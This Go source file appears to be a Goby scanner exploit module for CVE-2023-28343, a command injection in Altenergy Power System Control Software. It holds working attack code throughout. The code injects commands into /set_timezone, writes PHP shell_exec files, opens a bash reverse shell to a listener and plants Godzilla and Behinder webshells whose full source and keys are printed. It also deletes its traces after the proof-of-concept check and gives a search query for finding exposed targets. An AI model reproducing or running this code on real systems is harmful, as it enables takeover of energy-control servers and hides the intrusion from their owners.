package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Altenergy Power System Control Software set_timezone RCE Vulnerability (CVE-2023-28343)",
    "Description": "<p>Altenergy Power System Control Software is a microinverter control software from Altenergy Power System.</p><p>There is a security vulnerability in AlAltenergy Power System Control Software C1.2.5, which is caused by an operating system command injection vulnerability in /set_timezone. An attacker can execute arbitrary commands to obtain server privileges.</p>",
    "Product": "Altenergy-Power-System-Control-Software",
    "Homepage": "https://apsystems.com/",
    "DisclosureDate": "2023-03-15",
    "Author": "h1ei1",
    "FofaQuery": "body=\"Altenergy Power Control Software\" || body=\"/index.php/meter/meter_power_graph\"",
    "GobyQuery": "body=\"Altenergy Power Control Software\" || body=\"/index.php/meter/meter_power_graph\"",
    "Level": "2",
    "Impact": "<p>There is a security vulnerability in AlAltenergy Power System Control Software C1.2.5, which is caused by an operating system command injection vulnerability in /set_timezone. An attacker can execute arbitrary commands to obtain server privileges.</p>",
    "Recommendation": "<p>At present, the manufacturer has not released any repair measures to solve this security problem. Users who use this software are advised to pay attention to the manufacturer's homepage or refer to the website for solutions: <a href=\"https://apsystems.com/.\">https://apsystems.com/.</a></p>",
    "References": [
        "https://github.com/ahmedalroky/Disclosures/blob/main/apesystems/os_command_injection.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,behinder,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "dgfbfb.php",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php phpinfo(); ?>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-28343"
    ],
    "CNNVD": [
        "CNNVD-202303-1096"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "Altenergy Power System Control Software set_timezone 远程命令执行漏洞（CVE-2023-28343）",
            "Product": "Altenergy-Power-System-Control-Software",
            "Description": "<p>Altenergy Power System Control Software 是 Altenergy Power System 公司的微型逆变器控制软件。<br></p><p>AlAltenergy Power System Control Software C1.2.5 版本存在安全漏洞，该漏洞源于 /set_timezone 存在操作系统命令注入漏洞，攻击者可执行任意命令获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：<a href=\"https://apsystems.com/\">https://apsystems.com/</a>。<br></p>",
            "Impact": "<p>AlAltenergy Power System Control Software C1.2.5 版本存在安全漏洞，该漏洞源于 /set_timezone 存在操作系统命令注入漏洞，攻击者可执行任意命令获取服务器权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Altenergy Power System Control Software set_timezone RCE Vulnerability (CVE-2023-28343)",
            "Product": "Altenergy-Power-System-Control-Software",
            "Description": "<p>Altenergy Power System Control Software is a microinverter control software from Altenergy Power System.<br></p><p>There is a security vulnerability in AlAltenergy Power System Control Software C1.2.5, which is caused by an operating system command injection vulnerability in /set_timezone. An attacker can execute arbitrary commands to obtain server privileges.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has not released any repair measures to solve this security problem. Users who use this software are advised to pay attention to the manufacturer's homepage or refer to the website for solutions: <a href=\"https://apsystems.com/.\">https://apsystems.com/.</a><br></p>",
            "Impact": "<p>There is a security vulnerability in AlAltenergy Power System Control Software C1.2.5, which is caused by an operating system command injection vulnerability in /set_timezone. An attacker can execute arbitrary commands to obtain server privileges.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-11",
    "PocId": "10762"
}`
	base64EncodeFY7f74RG := func(input string) string {
		inputBytes := []byte(input)
		return base64.StdEncoding.EncodeToString(inputBytes)
	}
	sendPayloadFY7f74RG := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		requestConfig := httpclient.NewPostRequestConfig("/index.php/management/set_timezone")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		requestConfig.Data = "timezone=`" + payload + "`"
		return httpclient.DoHttpRequest(hostInfo, requestConfig)
	}
	checkFileExistFY7f74RG := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		if !strings.HasPrefix(uri, "/") {
			uri = "/" + uri
		}
		getFileConfig := httpclient.NewGetRequestConfig(uri)
		getFileConfig.VerifyTls = false
		getFileConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getFileConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randFileName := goutils.RandomHexString(6) + ".txt"
			resp, err := sendPayloadFY7f74RG(hostInfo, "123|md5sum > "+randFileName)
			if err != nil {
				return false
			} else if resp != nil && resp.StatusCode == 200 {
				respGetFile, err := checkFileExistFY7f74RG(hostInfo, randFileName)
				if err != nil {
					return false
				} else if respGetFile != nil && respGetFile.StatusCode == 200 && strings.Contains(respGetFile.RawBody, "d41d8cd98f00b204e9800998ecf8427e") {
					// 因为只要 checkfile 存在了，就能证明漏洞点存在，因为是 POC 环节，所以需要检测到漏洞为优先。 后续两个包，进行痕迹清除工作。不额外做报错处理
					sendPayloadFY7f74RG(hostInfo, "echo Asia/Taipei > /etc/yuneng/timezone.conf")
					sendPayloadFY7f74RG(hostInfo, "rm "+randFileName)
					return true
				}
			}
			return false

		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType != "cmd" && attackType != "reverse" && attackType != "webshell" {
				expResult.Success = false
				expResult.Output = "未知的攻击方式"
				return expResult
			}
			if attackType == "cmd" {
				cmd := goutils.B2S(stepLogs.Params["cmd"])
				respCmd, err := sendPayloadFY7f74RG(expResult.HostInfo, "echo \"<?php echo shell_exec(base64_decode(\\\""+url.QueryEscape(base64EncodeFY7f74RG(cmd))+"\\\")); ?>\" > A3ffBa2.php")
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				} else if respCmd != nil && respCmd.StatusCode == 200 && strings.Contains(respCmd.RawBody, "A PHP Error was encountered") {
					respCheckCmd, err := checkFileExistFY7f74RG(expResult.HostInfo, "A3ffBa2.php")
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					} else if respCheckCmd != nil && respCheckCmd.StatusCode == 200 {
						expResult.Success = true
						expResult.Output = respCheckCmd.RawBody
					} else {
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
						return expResult
					}
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				//rp就是拿到的监听端口
				if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) == 0 {
					expResult.Output = "godclient bind failed!"
					expResult.Success = false
					return expResult
				} else {
					reverse := godclient.ReverseTCPByBash(rp)
					_, err := sendPayloadFY7f74RG(expResult.HostInfo, "echo \"<?php echo shell_exec(base64_decode(\\\""+url.QueryEscape(base64EncodeFY7f74RG(reverse))+"\\\")); ?>\" > A3ffBa2.php")
					if err != nil {
						return expResult
					}
					_, err = checkFileExistFY7f74RG(expResult.HostInfo, "A3ffBa2.php")
					if err != nil {
						return expResult
					}
					select {
					case webConsoleID := <-waitSessionCh:
						u, err := url.Parse(webConsoleID)
						if err != nil {
							expResult.Success = false
							expResult.Output = err.Error()
							return expResult
						}
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					case <-time.After(time.Second * 20):
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
					}
				}
			} else if attackType == "webshell" {
				webshell := goutils.B2S(stepLogs.Params["webshell"])
				filename := goutils.B2S(stepLogs.Params["filename"])
				content := goutils.B2S(stepLogs.Params["content"])
				if webshell == "godzilla" {
					filename = goutils.RandomHexString(6) + ".php"
					content = `<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass="pass"; $payloadName="payload"; $key="3c6e0b8a9c15224a"; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key);}}}?>`
				} else if webshell == "behinder" {
					filename = goutils.RandomHexString(6) + ".php"
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "custom" {
					filename = goutils.B2S(stepLogs.Params["filename"])
					content = goutils.B2S(stepLogs.Params["content"])
				} else {
					expResult.Success = false
					expResult.Output = `未知的的利用方式`
					return expResult
				}
				respWebshell, err := sendPayloadFY7f74RG(expResult.HostInfo, "echo \"<?php file_put_contents(\\\""+filename+"\\\",base64_decode(\\\""+base64EncodeFY7f74RG(content)+"\\\"));?>\" > A3ffBa2.php")
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				} else if respWebshell != nil && respWebshell.StatusCode != 200 && respWebshell.StatusCode != 500 {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
					return expResult
				}
				// 访问 php 文件，执行命令
				checkFileExistFY7f74RG(expResult.HostInfo, "A3ffBa2.php")
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename + "\n"
				if webshell == "godzilla" {
					expResult.Output += "Password: pass 密钥：key 加密器：PHP_XOR_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				} else if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				}
				expResult.Output += "Webshell type: php"
				return expResult
			}
			return expResult
		},
	))
}
